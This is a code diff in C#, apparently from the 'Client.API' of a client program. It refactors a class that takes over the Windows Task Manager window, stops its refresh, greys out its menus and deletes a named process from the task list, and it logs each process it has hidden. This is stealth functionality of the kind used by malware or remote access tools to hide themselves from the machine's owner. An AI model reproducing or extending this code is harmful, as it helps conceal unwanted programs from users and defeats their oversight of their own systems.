@@ -49,9 +49,9 @@ namespace Client.API
                 // Refresh now button
                 int _refreshNowButton; 
                 
-                public TaskManagerStruct(string te)
+                public TaskManagerStruct(IntPtr TaskManagerParentAddress)
                 {
-                    _lhWndParent = User32.FindWindow(null, "Task Manager");
+                    _lhWndParent = TaskManagerParentAddress; 
 
                     _lhTaskManagerMain = new IntPtr(); 
                     _lhDirectUIHWND = new IntPtr();
@@ -64,6 +64,9 @@ namespace Client.API
 
                     _refreshNowButton = 0;
                     _mRefreshOptions = new List<int>();
+
+                    PopulateOffsets();
+                    OutputOffsets();
                 }
 
                 public void DisableSorting(bool disable)
@@ -105,7 +108,7 @@ namespace Client.API
                         User32.EnableMenuItem(_hMenu, (uint) b, disable? User32.MF_GRAYED : User32.MF_ENABLED);
                 }
 
-                public void PopulateOffsets()
+                private void PopulateOffsets()
                 {
                     #region Window Panel
                     _lhTaskManagerMain = User32.FindWindowEx(_lhWndParent, _lhTaskManagerMain, null, null);
@@ -142,6 +145,17 @@ namespace Client.API
                         User32.GetMenuItemID(_hSubSubMenu, 3)
                     };
                     #endregion
+                }
+
+                private void OutputOffsets()
+                {
+                    Console.WriteLine("\nTask Manager Instance Offsets:");
+                    Console.WriteLine("lhWndParent:\t\t0x" + lhWndParent.ToString("X"));
+                    Console.WriteLine("lhTaskManagerMain:\t0x" + lhTaskManagerMain.ToString("X"));
+                    Console.WriteLine("lhDirectUIHWND:\t\t0x" + lhDirectUIHWND.ToString("X"));
+                    Console.WriteLine("lhSysListView32:\t0x" + lhSysListView32.ToString("X"));
+                    Console.WriteLine("lhSysHeader32:\t\t0x" + lhSysHeader32.ToString("X"));
+                    Console.WriteLine("\n");
                 }
 
                 public IntPtr lhWndParent
@@ -186,7 +200,7 @@ namespace Client.API
                     if (TaskMgrAddress != IntPtr.Zero)
                     {
                         _Log.Write(Logger.Actions.INFO, "Detected Task Manager at 0x" + TaskMgrAddress.ToString("X"));
-                        if (DeleteProcessFromTaskList(processName))
+                        if (DeleteProcessFromTaskList(processName, TaskMgrAddress))
                         {
                             _Log.Write(Logger.Actions.INFO, "Hidden: " + processName, "OK");
                             break;
@@ -201,10 +215,10 @@ namespace Client.API
             ///     Hides a process from the task manager description tasklist
             /// </summary>
             /// <param name="procName"> The desired process to hide.</param>
-             private static bool DeleteProcessFromTaskList(object procName)
+             private static bool DeleteProcessFromTaskList(object procName, IntPtr TaskManagerInstance)
             {
-                TaskManagerStruct taskManager = new TaskManagerStruct();
-                 taskManager.PopulateOffsets();
+                // Hook and wrap the detected Task Manager window
+                TaskManagerStruct taskManager = new TaskManagerStruct(TaskManagerInstance);
               
 
                  taskManager.SetRefreshRate(TaskManagerStruct.RefreshRates.Stop);
